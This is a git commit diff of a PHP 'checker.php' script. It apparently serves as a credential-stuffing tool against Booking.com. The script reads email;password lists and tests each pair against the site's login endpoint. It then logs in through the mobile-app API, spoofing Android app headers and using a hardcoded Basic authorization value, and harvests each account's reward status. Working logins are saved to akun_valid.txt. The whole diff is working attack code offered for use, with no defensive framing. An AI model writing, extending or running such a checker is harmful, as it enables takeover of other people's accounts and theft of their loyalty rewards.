6a4839ffd1e660019ad443e0ce783e9754f1e07a
mrsetset <64625900+mrsetset@users.noreply.github.com>
2020-07-01 00:20:54 +0700

    Update checker.php

--- checker.php
+++ checker.php
@@ -32,7 +32,11 @@ class curl {
                 break;
         }
         curl_setopt($this->ch, CURLOPT_URL, $url);
-        curl_setopt($this->ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0');
+        if(is_numeric(strpos($url, 'account.booking.com'))) {
+            curl_setopt($this->ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0');
+        } else {
+            curl_setopt($this->ch, CURLOPT_USERAGENT, 'Booking.App/22.9 Android/9; Type: mobile; AppStore: google; Brand: xiaomi; Model: Redmi Note 8;');
+        }
         curl_setopt($this->ch, CURLOPT_HEADER, false);
         curl_setopt($this->ch, CURLOPT_HTTPHEADER, $header);
         curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
@@ -64,6 +68,13 @@ class bookingcom extends curl{
         return $string;
     }
 
+    function uuid(){
+        $data = random_bytes(16);
+        $data[6] = chr(ord($data[6]) & 0x0f | 0x40); 
+        $data[8] = chr(ord($data[8]) & 0x3f | 0x80); 
+        return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
+    }
+
     function check($email, $password, $client_id) { 
 
         $method   = 'POST';
@@ -82,42 +93,53 @@ class bookingcom extends curl{
             "op_token": "EgVvYXV0aCKNBQoUdk8xS2Jsazd4WDl0VW4yY3BaTFMSCWF1dGhvcml6ZRo1aHR0cHM6Ly9zZWN1cmUuYm9va2luZy5jb20vbG9naW4uaHRtbD9vcD1vYXV0aF9yZXR1cm4qrARVcDREUFZVbGQ4MUFaZU1mb2NFdFBSelhYQzBkRG9mNVl5dmJWaG5lS0tadGhuYUhBRFNKT0U2MGtaRHRKcy1XRzVXSHFTaXR4QmZ1VVBYMy02X3lJNC1kTEoyV0hIWXNmcDZrLWFiMlNKRGltUE1DaTE2S0NrZjNQM3R6Q1lvejJBN0dGQTRva0pHM2NLeElDLVlUT21NQk1aSzUtVEpGWElUVDQwclZlOERZRWpxNGxXaUFVUXVlUlJaOUo2SmhCdDhGbWdETW9BaTAtU1JIdWdiVWg3NTlrSWhrcDVsc2tXSXBseXJDZ3dIaFhoLXB4WGVrZlFMWFNBSXd2Tllkd291VDhDQmlHTVA2MHBhV3lmdWlTZnhVWUlkV2lobkd2QlkwWTN2RWNraWRkci1JM2RHZDVrRC1sVHNQOU9kLUExX2ZjaEkwcFZSUkZjdUo0TnJTallJUVZkd2Q0eXJ4MjZXb3VOM1g1UE9MdjhEQ2lZRFJidW14alg2dFZfR0JnRl9XSHM3bGNjUVdWNFNrby1yR3Nzb19UYmlVNXRud1JuTUFNTm56LUUzaF91TmN0b3RYMm96b09RSEdnZFo2OVFMOEFZY25qS2t0anRjVklFRlBfNGgzY1ZqeHhUWnR6Ry1TZG5odk9RbU0yN21mR0ZLcjR4OUNFam55bnJqa3hZM20wd2pHdFg3TjV5aGQ4VkIxbDFLbktaTFVsSUtSM2dtcGVETm9JWG43QgRjb2RlKg4IjsgSOgBCAFiJzuz3BQ"
         }';
         
-        retry:
-        $check = $this->request ($method, $endpoint, $param, $header);
+        $check = $this->request ($method, $endpoint, $param, $header); 
 
         $json = json_decode($check);
  
-        if($json->next_step == 'redirect') { 
+        return $json;       
+    }
 
-            $file = dirname(__FILE__)."/akun_valid.txt";
-            if(file_exists($file)) {
-                unlink($file);
-            }
+    function login_apk($email, $password, $device_id, $header) {
 
-            $fh = fopen($file, "a");
-            fwrite($fh, $email.";".$password."\n");
-            fclose($fh);
+        $method   = 'POST';
+        $header[] = 'Content-Type: application/x-gzip; contains="application/json"; charset=utf-8';
 
-            return $email.". AMAN BRO\n";
-            
-        } elseif ($json->next_step == '/account-disabled') {
-            return $email." BANNED\n"; 
-        } elseif ($json->errors[0] == 1203) {
-            return $email." SALAH PASSWORD\n"; 
-        } elseif ($json->errors[0] == 1302) {
-            return $email." TIDAK TERDAFTAR\n"; 
+        $endpoint = 'https://secure-iphone-xml.booking.com/json/mobile.login?&user_os=9&user_version=22.9-android&device_id='.$device_id.'&network_type=wifi&languagecode=en-us&display=normal_xxhdpi&affiliate_id=337862';
+        
+        $param = '{
+            "email": "'.$email.'",
+            "password": "'.$password.'"
+        }';
+
+        $login = $this->request ($method, $endpoint, $param, $header); 
+
+        $json = json_decode($login);
+ 
+        if(isset($json->auth_token)) {
+            return $json->auth_token;
         } else {
-            echo "[!] UNKNOWN ERROR: ".$check."\n"; 
-            sleep(2);
-            goto retry;
-        }       
+            return FALSE;
+        }
+    }
+
+    function reward($device_id, $auth_token, $header) {
+
+        $method   = 'GET';
+        $endpoint = 'https://mobile-apps.booking.com/json/mobile.getRewards?supports_cta_actions=1&app_supports_gem_rewards=1&currency_code=IDR&user_os=9&user_version=22.9-android&device_id='.$device_id.'&network_type=wifi&auth_token='.$auth_token.'&languagecode=en-us&display=normal_xxhdpi&affiliate_id=337862';
+        
+        $reward = $this->request ($method, $endpoint, $param=NULL, $header);
+
+        $json = json_decode($reward);
+
+        return $json;
     }
 }
 
 /**
  * Running
  */
-$version = '1.0';
+$version = '1.1';
 $update = file_get_contents('https://econxn.id/setset/turu.json');
 $json = json_decode($update);
 if($json->version != $version) {
@@ -140,7 +162,15 @@ $bocom = new bookingcom();
 echo "Enter...";
 trim(fgets(STDIN));
 
+$header[] = 'X-LIBRARY: okhttp+network-api';
+$header[] = 'Authorization: Basic dGhlc2FpbnRzYnY6ZGdDVnlhcXZCeGdN';
+
 $file = dirname(__FILE__)."/akun.txt";
+
+$file2 = dirname(__FILE__)."/akun_valid.txt";
+if(file_exists($file2)) {
+    unlink($file2);
+}
 
 if(file_exists($file)) {
     $list = explode("\n",str_replace("\r","",file_get_contents($file)));
@@ -149,7 +179,7 @@ if(file_exists($file)) {
     foreach ($list as $value) {
 
         if(!is_numeric(strpos($value, ';'))) {
-            echo "(!) Format harus email;password\n\n";
+            echo "[".$no++."] Format harus email;password\n\n";
             die();
         }
 
@@ -157,14 +187,68 @@ if(file_exists($file)) {
         $email     = $account[0];
         $password  = $account[1];
         $client_id = $bocom->random(16);
+        $device_id = $bocom->uuid();
         
+        check:
         $check = $bocom->check($email, $password, $client_id);
 
-        echo "[".$no++."] ".$check;
+        if($check->next_step == 'redirect') { 
+
+            $login_apk = $bocom->login_apk($email, $password, $device_id, $header);
+            if($login_apk == FALSE) {
+                echo "[".$no++."] ACTIVE - ".$email." Check Reward Later\n";
+            } else {
+                $reward = $bocom->reward($device_id, $login_apk, $header);
+
+                $rewarded  = $reward->data->programs[0]->groups[0]->rewards[0]->status->name;
+
+                if($reward->data->programs == []) {
+                    echo "[".$no++."] ACTIVE - ".$email." No Reward\n";
+                } elseif(isset($rewarded)) {
+                    echo "[".$no++."] ACTIVE - ".$email." ".$rewarded."\n";
+                } else {
+                    echo "[".$no++."] ACTIVE - ".$email." Check Reward Later\n";
+                }
+            }
+
+            $fh = fopen($file2, "a");
+            fwrite($fh, $email.";".$password.";ACTIVE;".$rewarded."\n");
+            fclose($fh);
+          
+        } elseif ($check->next_step == '/account-disabled') {
+            $login_apk = $bocom->login_apk($email, $password, $device_id, $header);
+            if($login_apk == FALSE) {
+                echo "[".$no++."] BANNED - ".$email." Check Reward Later\n";
+            } else {
+                $reward = $bocom->reward($device_id, $login_apk, $header);
+
+                $rewarded  = $reward->data->programs[0]->groups[0]->rewards[0]->status->name;
+
+                if($reward->data->programs == []) {
+                    echo "[".$no++."] BANNED - ".$email." No Reward\n";
+                } elseif(isset($rewarded)) {
+                    echo "[".$no++."] BANNED - ".$email." ".$rewarded."\n";
+                } else {
+                    echo "[".$no++."] BANNED - ".$email." Check Reward Later\n";
+                }
+            }
+
+            $fh = fopen($file2, "a");
+            fwrite($fh, $email.";".$password.";BANNED;".$rewarded."\n");
+            fclose($fh);
+
+        } elseif ($check->errors[0] == 1203) {
+            echo "[".$no++."] ".$email." SALAH PASSWORD\n"; 
+        } elseif ($check->errors[0] == 1302) {
+            echo "[".$no++."] ".$email." TIDAK TERDAFTAR\n"; 
+        } else {
+            echo "[!] UNKNOWN ERROR: ".$check."\n"; 
+            sleep(2);
+            goto check;
+        }  
     }
 
-    echo "\n(i) Your valid account has saved in akun_valid.txt\n\n";
-    
+    echo "\n(i) Your valid account has saved in akun_valid.txt\n\n";    
 
 } else {
     goto start;
